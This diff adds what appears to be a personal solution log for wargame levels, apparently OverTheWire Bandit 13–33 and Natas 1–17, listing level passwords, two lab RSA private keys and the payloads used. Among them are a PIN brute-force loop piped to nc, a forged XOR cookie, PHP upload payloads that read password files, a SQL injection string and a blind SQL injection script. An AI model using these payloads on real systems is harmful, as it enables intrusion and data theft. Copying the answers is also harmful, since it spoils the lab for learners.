@@ -1,0 +1,191 @@
+13
+8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+
+14
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+
+gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB
+ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb
+ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV
+ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7
+jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA
+J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE
+pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67
+xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS
+nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD
+o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe
+ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf
+laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS
+M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU
+1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH
+PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s
+8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+
+xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1
+GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J
+3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY
+iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby
+9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD
+qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0
+kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN
+/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==
+-----END RSA PRIVATE KEY-----
+
+15
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+
+
+16
+echo "cluFn7wTiGryunymYOu4RcffSxQluehd" | openssl s_client -ign_eof -connect :31790
+
+17
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+
+18
+kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+
+19
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+20
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+21
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+22
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+23
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+24
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+for i in {0000..9999}; do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"; done | nc localhost 30002 | grep -v -e "Wrong"
+
+25
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+26
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+27
+3ba3118a22e93127a4ed485be72ef5ea
+
+28
+0ef186ac70e04ea33b4c1853d2526fa2
+
+29
+bbc96594b4e001778eee9975372716b2
+
+30
+5b90576bedb2cc04c86a9e924ce42faf
+
+31
+47e603bb428404d265f59c42920d81e5
+
+32
+56a9bf19c63d650ce78e6ec0354ee45e
+
+33
+c9c3199ddf4121b10cf581a98d51caee
+
+natas1
+gtVrDuiDfck831PqWsLEZy5gyDz1clto
+
+natas2
+ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
+natas3
+sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+natas4
+Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+natas5
+iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+natas6
+aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+natas7
+7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+natas8
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+natas9
+W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+natas10
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+natas11
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+natas12
+default json {"showpassword":"no","bgcolor":"#ffffff"}
+default cookie value ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw
+xor $decoded-cookie-value {"showpassword":"no","bgcolor":"#ffffff"}
+=> key qw8J
+
+base64 xor $key {"showpassword":"yes","bgcolor":"#ffffff"}
+=> EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+natas13
+<?php
+echo file_get_contents('/etc/natas_webpass/natas13');
+?>
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+natas14
+jhead -ce
+<?php echo file_get_contents('/etc/natas_webpass/natas14'); __halt_compiler();
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+natas15
+x" OR 1="1
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+natas16
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+$idx=0
+$pw=""
+$url="http://natas15.natas.labs.overthewire.org/index.php"
+while len($pw) < 32
+	$idx++
+	for $a in 48..58 97..122 65..90
+		$res = post $url { "username": "natas16' AND ASCII(SUBSTRING(username,$idx,1))=$a AND 1='1" }
+		if $res.contains("user exists")
+			$pw+=$a
+			break;
+
+natas17
+1PS4H6GWBN1rD1S1GMADGqNDKHPKq3C
+
